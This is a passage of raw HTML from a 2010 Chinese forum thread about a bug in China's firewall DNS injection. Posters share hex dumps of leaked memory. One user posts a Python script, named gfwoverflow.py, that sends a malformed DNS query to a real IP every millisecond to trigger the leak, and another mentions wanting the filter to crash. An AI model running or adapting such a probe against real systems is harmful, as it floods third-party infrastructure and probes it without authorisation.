						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum852644" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid852644', '话题链接已经复制到剪贴板')">29楼</strong>
													<em onclick="$('postmessage_852644').className='t_bigfont'">大</em>							<em onclick="$('postmessage_852644').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_852644').className='t_smallfont'">小</em>												发表于 2010-10-2 14:43&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_28"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_28"></div><div id="ad_thread4_28"></div>
													<h2>回复 28楼 id已被绿坝屏蔽 的话题</h2>
						
						
																											<div id="postmessage_852644" class="t_msgfont">我指的是墙外对墙外的ip进行操作，那肯定是没反应的。<br />
laoyang可以换<a href="http://www.baidu.com" target="_blank">www.baidu.com</a> 53试试了。</div>

							
							
							
							
															<div id="post_rate_div_852644"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo852644_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=852644&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 852644)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_28"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid852653" summary="pid852653" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=8395" target="_blank" id="userinfo852653" class="dropmenu" onmouseover="showMenu(this.id)">laoyang</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">尘世中一个迷途小书童</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=8395">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=8395&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_29" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum852653" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid852653', '话题链接已经复制到剪贴板')">30楼</strong>
													<em onclick="$('postmessage_852653').className='t_bigfont'">大</em>							<em onclick="$('postmessage_852653').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_852653').className='t_smallfont'">小</em>												发表于 2010-10-2 14:56&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=8395" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_29"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_29"></div><div id="ad_thread4_29"></div>
													<h2>回复 29楼 麦圆 的话题</h2>
						
						
																											<div id="postmessage_852653" class="t_msgfont">好，昨天我用的是新浪的，一直没有看到什么东西 呵呵</div>

							
							
							
							
															<div id="post_rate_div_852653"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo852653_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=8395" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=852653&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 852653)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_29"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid854556" summary="pid854556" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6612" target="_blank" id="userinfo854556" class="dropmenu" onmouseover="showMenu(this.id)">无穷无尽</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6612">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6612&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_30" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum854556" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid854556', '话题链接已经复制到剪贴板')">31楼</strong>
													<em onclick="$('postmessage_854556').className='t_bigfont'">大</em>							<em onclick="$('postmessage_854556').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_854556').className='t_smallfont'">小</em>												发表于 2010-10-4 17:09&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6612" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_30"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_30"></div><div id="ad_thread4_30"></div>
						
						
																											<div id="postmessage_854556" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>lehui99</i> 于 2010-9-29 22:49 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=849608&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
最好让GFW进程crash<br />
<br />
看到有很多访问 <a href="http://www.45setv.com/" target="_blank">http://www.45setv.com/</a> 的。 </blockquote></div>弓虽</div>

							
							
							
							
															<div id="post_rate_div_854556"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo854556_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6612" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=854556&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 854556)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_30"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid855252" summary="pid855252" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=5355" target="_blank" id="userinfo855252" class="dropmenu" onmouseover="showMenu(this.id)">hikui</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=5355">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=5355&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_31" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum855252" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid855252', '话题链接已经复制到剪贴板')">32楼</strong>
													<em onclick="$('postmessage_855252').className='t_bigfont'">大</em>							<em onclick="$('postmessage_855252').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_855252').className='t_smallfont'">小</em>												发表于 2010-10-5 11:23&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=5355" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_31"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_31"></div><div id="ad_thread4_31"></div>
						
						
																											<div id="postmessage_855252" class="t_msgfont">很神奇。。</div>

							
							
							
							
															<div id="post_rate_div_855252"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo855252_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=5355" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=855252&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 855252)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_31"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid856015" summary="pid856015" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12307" target="_blank" id="userinfo856015" class="dropmenu" onmouseover="showMenu(this.id)">tywtyw2002</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12307">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12307&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_32" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum856015" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid856015', '话题链接已经复制到剪贴板')">33楼</strong>
													<em onclick="$('postmessage_856015').className='t_bigfont'">大</em>							<em onclick="$('postmessage_856015').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_856015').className='t_smallfont'">小</em>												发表于 2010-10-6 08:55&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=12307" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_32"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_32"></div><div id="ad_thread4_32"></div>
						
						
																											<div id="postmessage_856015" class="t_msgfont">get_peers1&nbsp;&nbsp;多半是bt 流量</div>

							
							
							
							
															<div id="post_rate_div_856015"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo856015_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12307" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=856015&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 856015)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_32"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid856058" summary="pid856058" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12307" target="_blank" id="userinfo856058" class="dropmenu" onmouseover="showMenu(this.id)">tywtyw2002</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12307">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12307&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_33" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum856058" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid856058', '话题链接已经复制到剪贴板')">34楼</strong>
													<em onclick="$('postmessage_856058').className='t_bigfont'">大</em>							<em onclick="$('postmessage_856058').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_856058').className='t_smallfont'">小</em>												发表于 2010-10-6 09:31&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=12307" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_33"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_33"></div><div id="ad_thread4_33"></div>
						
						
																											<div id="postmessage_856058" class="t_msgfont">http%3A%2F%2|<br />
00000054&nbsp;&nbsp;46 73 68 61 72 65 2e 72&nbsp;&nbsp;65 6e 72 65 6e 2e 63 6f&nbsp;&nbsp;|Fshare.renren.co|<br />
00000064&nbsp;&nbsp;6d 25 32 46 73 68 61 72&nbsp;&nbsp;65 25 32 46 47 65 74 53&nbsp;&nbsp;|m%2Fshare%2FGetS|<br />
00000074&nbsp;&nbsp;68 61 72 65 2e 64 6f 25&nbsp;&nbsp;33 46 69 64 25 33 44 33&nbsp;&nbsp;|hare.do%3Fid%3D3|<br />
00000084&nbsp;&nbsp;34 30 37 37 35 39 37 30&nbsp;&nbsp;34 25 32 36 6f 77 6e 65&nbsp;&nbsp;|407759704%26owne|<br />
00000094&nbsp;&nbsp;72 25 33 44 33 32 c0 0c&nbsp;&nbsp;00 01 00 01 00 00 01 2c&nbsp;&nbsp;|r%3D32.</div>

							
							
							
							
															<div id="post_rate_div_856058"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo856058_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12307" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=856058&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 856058)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_33"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid860445" summary="pid860445" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16496" target="_blank" id="userinfo860445" class="dropmenu" onmouseover="showMenu(this.id)">lehui99</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16496">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16496&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_34" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum860445" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid860445', '话题链接已经复制到剪贴板')">35楼</strong>
													<em onclick="$('postmessage_860445').className='t_bigfont'">大</em>							<em onclick="$('postmessage_860445').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_860445').className='t_smallfont'">小</em>												发表于 2010-10-8 22:00&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16496" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_34"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_34"></div><div id="ad_thread4_34"></div>
						
						
																											<div id="postmessage_860445" class="t_msgfont">为了能在Windows下使用，改写成了python：<div class="blockcode"><em onclick="copycode($('code2'));">复制内容到剪贴板</em><h5>代码:</h5><code id="code2">import socket<br />
import binascii<br />
import time<br />
import threading<br />
<br />
class DataReceiver:<br />
&nbsp; &nbsp; &nbsp; &nbsp; def __init__(self, s):<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; self.s = s<br />
&nbsp; &nbsp; &nbsp; &nbsp; def __call__(self):<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while True:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; r = s.recvfrom(65535)[0]<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i = 0<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while i &lt; len(r):<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print '%04x:' % i,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p = list(r[i : i + 16])<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for j in range(0, len(p)):<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print binascii.b2a_hex(p[j]),<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if p[j] &lt; ' ' or p[j] &gt; '~':<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p[j] = '.'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print ' ' * ((15 - j) * 3),<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &quot;&quot;.join(p)<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i += 16<br />
<br />
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />
threading.Thread(target = DataReceiver(s)).start()<br />
while True:<br />
&nbsp; &nbsp; &nbsp; &nbsp; s.sendto(&quot;\0\0\1\0\0\1\0\0\0\0\0\0\6wux.ru\377&quot;, (&quot;218.30.54.118&quot;, 53))<br />
&nbsp; &nbsp; &nbsp; &nbsp; time.sleep(0.001)</code></div>安装好python 2.6，把代码复制到记事本，保存为gfwoverflow.py，在命令行执行python gfwoverflow.py就能看到结果了。<br />
<br />
[<i> 本帖最后由 lehui99 于 2010-10-8 22:02 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_860445"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo860445_menu" style="display: none;">
										<dl></dl>
											<p><a href="https://www.google.com/reader/shared/lehui99" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=16496" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=860445&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 860445)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_34"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid860685" summary="pid860685" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6975" target="_blank" id="userinfo860685" class="dropmenu" onmouseover="showMenu(this.id)">zpclxc</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6975">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6975&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_35" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum860685" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid860685', '话题链接已经复制到剪贴板')">36楼</strong>
													<em onclick="$('postmessage_860685').className='t_bigfont'">大</em>							<em onclick="$('postmessage_860685').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_860685').className='t_smallfont'">小</em>												发表于 2010-10-8 23:00&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6975" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_35"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_35"></div><div id="ad_thread4_35"></div>
						
						
																											<div id="postmessage_860685" class="t_msgfont">强啊，技术盲围观</div>

							
							
							
							
															<div id="post_rate_div_860685"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo860685_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6975" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=860685&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 860685)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_35"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid860835" summary="pid860835" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=19477" target="_blank" id="userinfo860835" class="dropmenu" onmouseover="showMenu(this.id)">mycccc</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=19477">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=19477&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_36" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum860835" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid860835', '话题链接已经复制到剪贴板')">37楼</strong>
													<em onclick="$('postmessage_860835').className='t_bigfont'">大</em>							<em onclick="$('postmessage_860835').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_860835').className='t_smallfont'">小</em>												发表于 2010-10-8 23:58&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=19477" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_36"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_36"></div><div id="ad_thread4_36"></div>
						
						
																											<div id="postmessage_860835" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>lehui99</i> 于 2010-10-8 22:00 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=860445&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
为了能在Windows下使用，改写成了python：<br />
import socket<br />
import binascii<br />
import time<br />
import threading<br />
<br />
class DataReceiver:<br />
&nbsp; &nbsp; &nbsp; &nbsp; def __init__(self, s):<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; self.s = s<br />
&nbsp; &nbsp; &nbsp; &nbsp; def __call__(self):<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while True ... </blockquote></div>好同学<br />
但：<br />
Exception in thread Thread-1:<br />
Traceback (most recent call last):<br />
&nbsp;&nbsp;File &quot;C:\Python26\lib\threading.py&quot;, line 525, in __bootstrap_inner<br />
&nbsp; &nbsp; self.run()<br />
&nbsp;&nbsp;File &quot;C:\Python26\lib\threading.py&quot;, line 477, in run<br />
&nbsp; &nbsp; self.__target(*self.__args, **self.__kwargs)<br />
&nbsp;&nbsp;File &quot;G:\gfw.py&quot;, line 11, in __call__<br />
&nbsp; &nbsp; r = s.recvfrom(65535)[0]<br />
error: [Errno 10022]</div>

							
							
							
							
															<div id="post_rate_div_860835"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo860835_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=19477" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=860835&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 860835)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_36"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid860865" summary="pid860865" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=3852" target="_blank" id="userinfo860865" class="dropmenu" onmouseover="showMenu(this.id)">CyberTime</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">One Man, No Man.</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=3852">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=3852&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_37" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum860865" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid860865', '话题链接已经复制到剪贴板')">38楼</strong>
													<em onclick="$('postmessage_860865').className='t_bigfont'">大</em>							<em onclick="$('postmessage_860865').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_860865').className='t_smallfont'">小</em>												发表于 2010-10-9 00:12&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=3852" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_37"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_37"></div><div id="ad_thread4_37"></div>
						
						
																											<div id="postmessage_860865" class="t_msgfont">小组技术实力确实很强啊。</div>

							
							
							
							
															<div id="post_rate_div_860865"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo860865_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=3852" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=860865&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 860865)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_37"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid860968" summary="pid860968" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16496" target="_blank" id="userinfo860968" class="dropmenu" onmouseover="showMenu(this.id)">lehui99</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16496">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16496&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_38" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum860968" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid860968', '话题链接已经复制到剪贴板')">39楼</strong>
													<em onclick="$('postmessage_860968').className='t_bigfont'">大</em>							<em onclick="$('postmessage_860968').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_860968').className='t_smallfont'">小</em>												发表于 2010-10-9 01:00&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16496" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_38"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_38"></div><div id="ad_thread4_38"></div>
													<h2>回复 37楼 mycccc 的话题</h2>
						
						
